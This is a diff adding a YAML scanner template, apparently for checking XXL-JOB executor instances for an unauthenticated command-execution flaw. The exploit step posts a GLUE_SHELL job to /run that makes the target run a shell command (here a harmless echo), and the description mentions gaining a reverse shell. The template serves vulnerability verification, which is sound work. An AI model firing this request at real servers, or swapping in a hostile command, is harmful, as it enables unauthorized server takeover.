@@ -1,0 +1,28 @@
+name: poc-yaml-xxljob-executor-unauth-rce
+set:
+  r1: randomLowercase(8)
+groups:
+  detect:
+    - method: GET
+      path: /
+      follow_redirects: false
+      expression: >
+        response.status == 200 && response.body.bcontains(b"invalid request, HttpMethod not support")
+  exploit:
+    - method: POST
+      path: /run
+      headers:
+        Content-Type: application/json
+      body: >-
+        {"jobId":1,"executorHandler":"demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"echo {{r1}}","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"200") || response.body.bcontains(b"code"))
+detail:
+  author: L4xy
+  description: "XXL-JOB <=2.2.0 executor存在未授权访问漏洞，攻击者可通过RESTful API(/run)执行任意命令，包括反弹shell获取服务器权限"
+  links:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/XXL-JOB-executor-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/xuxueli/xxl-job/issues/3333
+    - https://github.com/OneSourceCat/XxlJob-Hessian-RCE
+  tags: rce,xxljob,unauthorized
